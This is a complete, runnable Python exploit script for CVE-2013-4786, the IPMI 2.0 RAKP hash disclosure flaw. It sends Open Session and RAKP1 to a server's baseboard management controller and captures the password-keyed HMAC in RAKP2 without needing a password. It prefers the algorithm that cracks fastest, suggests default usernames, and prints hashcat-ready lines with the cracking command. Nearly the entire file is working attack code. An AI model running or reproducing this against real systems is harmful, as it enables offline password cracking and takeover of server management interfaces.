#!/usr/bin/env python3
"""
rakp_hashgrab.py — grab a crackable RAKP2 HMAC without completing auth.

WHAT     Drives RMCP+ Open Session + RAKP1, catches RAKP2, and extracts the
         Key Exchange Auth Code (the password-keyed HMAC) plus the exact salt
         bytes the BMC HMAC'd. Emits a hashcat-ready line. Never sends RAKP3,
         so no valid password is needed — only a valid username. This is
         CVE-2013-4786 (IPMI 2.0 RAKP hash disclosure).

WHY      The auth algorithm is attacker-chosen in the Open Session Request,
         and it sizes the RAKP2 Auth Code field. HMAC-MD5 cracks ~2-4x faster
         than HMAC-SHA1 on GPU, so we NEGOTIATE MD5 first (cipher suite 6),
         fall back to SHA1 (suite 1), then SHA256 (suite 17) — whichever the
         BMC will actually establish. Confidentiality algo is irrelevant: the
         RAKP2 HMAC is computed before any encryption.

SUCCESS  `demo()` self-check passes (salt layout reproduces rakp2_authcode's
         HMAC for a known password) AND, against a live BMC, the emitted line
         cracks in hashcat with a wordlist containing the real password.

TARGET   IPMI 2.0 §13.20-13.22 (RAKP), §13.28 (cipher suites). Any BMC with
         RMCP+/lanplus and a known/guessable username (root/admin/ADMIN/calvin).

BUILD/RUN
         pip install -e /Volumes/xxx/src/me/git/zipmi   # editable, see memory
         python examples/rakp_hashgrab.py 192.168.0.23 -U root
         python examples/rakp_hashgrab.py --demo        # offline self-check

RELATED  zipmi.core.Session._establish_with_cipher (full RAKP template),
         zipmi.scapy_ipmi.crypto.rakp2_authcode (the HMAC we invert),
         reference_zipmi_install_and_cipher (cipher-17-only OpenBMC gotcha).
"""
from __future__ import annotations

import argparse
import secrets
import sys

from zipmi.core import Session, IPMIError
from zipmi.scapy_ipmi.crypto import CIPHER_SUITES
from zipmi.scapy_ipmi.rakp import (
    OpenSessionRequest, OpenSessionResponse, RAKP1, RAKP2,
    auth_payload, integrity_payload, conf_payload,
)

# auth_alg -> (cipher suite carrying that auth algo, hashcat mode, salt-is-hex,
#              emit-order). Order of this list = negotiation preference:
# MD5 first (fastest crack), then SHA1, then SHA256.
#
# hashcat line order differs by mode:
#   -m 7300 (IPMI2 RAKP HMAC-SHA1): "<salt_hex>:<hmac_hex>"
#   -m 50   (HMAC-MD5,   key=$pass): "<hmac_hex>:<salt_hex>"  + --hex-salt
#   -m 1450 (HMAC-SHA256,key=$pass): "<hmac_hex>:<salt_hex>"  + --hex-salt
ALGOS = [
    # auth_alg, suite_id, hc_mode, hex_salt, salt_first
    (2, 6,  50,   True,  False),   # HMAC-MD5    via cipher suite 6
    (1, 1,  7300, False, True),    # HMAC-SHA1   via cipher suite 1
    (3, 17, 1450, True,  False),   # HMAC-SHA256 via cipher suite 17
]
ALG_NAME = {1: "HMAC-SHA1", 2: "HMAC-MD5", 3: "HMAC-SHA256"}


def _rakp2_salt(sid_c: int, sid_m: int, rc: bytes, rm: bytes,
                guid_m: bytes, role: int, uname: bytes) -> bytes:
    """The exact byte string the BMC keys-HMACs for RAKP2 (§13.22).
    MUST match zipmi.crypto.rakp2_authcode's `msg` construction, or the
    emitted salt won't crack."""
    return (
        sid_c.to_bytes(4, "little")
        + sid_m.to_bytes(4, "little")
        + rc + rm + guid_m
        + bytes([role, len(uname)])
        + uname
    )


def grab_one(sess: Session, auth_alg: int, suite_id: int, pad_username: bool):
    """Open Session + RAKP1 with `auth_alg`, catch RAKP2. Return
    (auth_code, salt) or raise IPMIError. Does NOT send RAKP3."""
    cs = CIPHER_SUITES[suite_id]
    sid_c = int.from_bytes(secrets.token_bytes(4), "little") or 1
    rc = secrets.token_bytes(16)

    osr = OpenSessionRequest(
        msg_tag=0x00, max_priv=0x00, remote_session_id=sid_c,
        auth_payload=auth_payload(cs.auth_alg),
        integrity_payload=integrity_payload(cs.integrity_alg),
        conf_payload=conf_payload(cs.conf_alg),
    )
    reply = sess._send_lanplus_outside_session(0x10, bytes(osr))
    if not reply.haslayer(OpenSessionResponse):
        raise IPMIError("Open Session rejected (no matching cipher suite?)")
    ores = reply[OpenSessionResponse]
    if ores.rmcp_status != 0:
        raise IPMIError(f"Open Session status 0x{ores.rmcp_status:02x}")
    sid_m = ores.managed_session_id

    uname = sess.username.encode("utf-8")
    if pad_username:                       # iDRAC-quirk targets only
        uname = uname.ljust(16, b"\x00")
    role = 0x10 | (sess.priv & 0x0F)       # name-only-lookup + max priv

    rakp1 = RAKP1(managed_session_id=sid_m, remote_random=rc,
                  role=role, user_name=uname)
    reply = sess._send_lanplus_outside_session(0x12, bytes(rakp1))
    if not reply.haslayer(RAKP2):
        raise IPMIError("no RAKP2")
    r2 = reply[RAKP2]
    if r2.rmcp_status != 0:               # 0x0d = unauthorized name
        raise IPMIError(f"RAKP2 status 0x{r2.rmcp_status:02x} "
                        f"(bad username '{sess.username}'?)")
    auth_code = bytes(r2.auth_code)
    if not auth_code:
        raise IPMIError("empty auth code (auth algo = none?)")
    salt = _rakp2_salt(sid_c, sid_m, rc, bytes(r2.managed_random),
                       bytes(r2.managed_guid), role, uname)
    # drop here — RAKP3 never sent, session never established.
    return auth_code, salt


def grab(host: str, username: str, pad_username: bool = False):
    """Try MD5 -> SHA1 -> SHA256 until one algo yields a hash."""
    sess = Session(host=host, username=username, password="x", lanplus=True)
    try:
        for auth_alg, suite_id, hc_mode, hex_salt, salt_first in ALGOS:
            try:
                auth_code, salt = grab_one(sess, auth_alg, suite_id, pad_username)
            except IPMIError as e:
                print(f"  {ALG_NAME[auth_alg]:11s} suite {suite_id:<2d} -> {e}",
                      file=sys.stderr)
                continue
            return auth_alg, hc_mode, hex_salt, salt_first, auth_code, salt
    finally:
        sess.transport.close()
    raise IPMIError("no auth algorithm produced a hash (all rejected)")


def format_line(salt_first: bool, auth_code: bytes, salt: bytes) -> str:
    h, s = auth_code.hex(), salt.hex()
    return f"{s}:{h}" if salt_first else f"{h}:{s}"


def demo() -> None:
    """Offline self-check: prove _rakp2_salt reproduces the crypto module's
    HMAC input, so an emitted salt actually cracks. No network."""
    import hmac as _hmac, hashlib
    from zipmi.scapy_ipmi.crypto import rakp2_authcode, CIPHER_SUITES, pad_password
    pw, uname = "calvin", b"root"
    sid_c, sid_m = 0x11223344, 0x55667788
    rc, rm = b"\xAA" * 16, b"\xBB" * 16
    guid_m, role = b"\xCC" * 16, 0x14
    for auth_alg, suite_id, *_ in ALGOS:
        cs = CIPHER_SUITES[suite_id]
        salt = _rakp2_salt(sid_c, sid_m, rc, rm, guid_m, role, uname)
        mine = _hmac.new(pad_password(pw), salt, cs.auth_hash).digest()
        oracle = rakp2_authcode(cs, pw, sid_c, sid_m, rc, rm, guid_m, role, uname)
        assert mine == oracle, f"salt layout wrong for {ALG_NAME[auth_alg]}"
        print(f"ok  {ALG_NAME[auth_alg]:11s} salt reproduces rakp2_authcode")
    print("demo: all salt layouts match — emitted lines will crack.")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("host", nargs="?", help="BMC IP/hostname")
    ap.add_argument("-U", "--user", default="root", help="username (default root)")
    ap.add_argument("-o", "--out", help="append hashcat line to this file")
    ap.add_argument("--pad", action="store_true",
                    help="NUL-pad username to 16B (iDRAC-quirk targets only)")
    ap.add_argument("--demo", action="store_true", help="offline self-check, no network")
    args = ap.parse_args()

    if args.demo:
        demo(); return 0
    if not args.host:
        ap.error("host required (or use --demo)")

    try:
        auth_alg, hc_mode, hex_salt, salt_first, auth_code, salt = grab(
            args.host, args.user, args.pad)
    except IPMIError as e:
        print(f"FAILED: {e}", file=sys.stderr); return 1

    line = format_line(salt_first, auth_code, salt)
    print(f"\n# {ALG_NAME[auth_alg]}  ({len(auth_code)}-byte auth code)")
    print(line)
    hexflag = " --hex-salt" if hex_salt else ""
    print(f"\n# crack:\n#   hashcat -m {hc_mode}{hexflag} <(echo '{line}') wordlist.txt",
          file=sys.stderr)
    if args.out:
        with open(args.out, "a") as f:
            f.write(line + "\n")
        print(f"# appended to {args.out}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
